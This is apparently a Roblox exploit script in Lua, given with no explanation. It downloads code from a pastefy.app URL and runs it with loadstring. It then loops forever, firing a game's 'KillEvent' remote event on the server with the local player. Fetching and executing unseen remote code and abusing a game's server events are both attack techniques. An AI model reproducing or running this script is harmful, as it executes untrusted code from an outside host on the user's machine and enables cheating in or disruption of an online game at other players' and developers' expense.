loadstring(game:HttpGet("https://pastefy.app/XFIQLT4j/raw"))()

while true do
task.wait()
game:FindService("ReplicatedStorage").Events.KillEvent:FireServer(game:FindService("Players").LocalPlayer)
end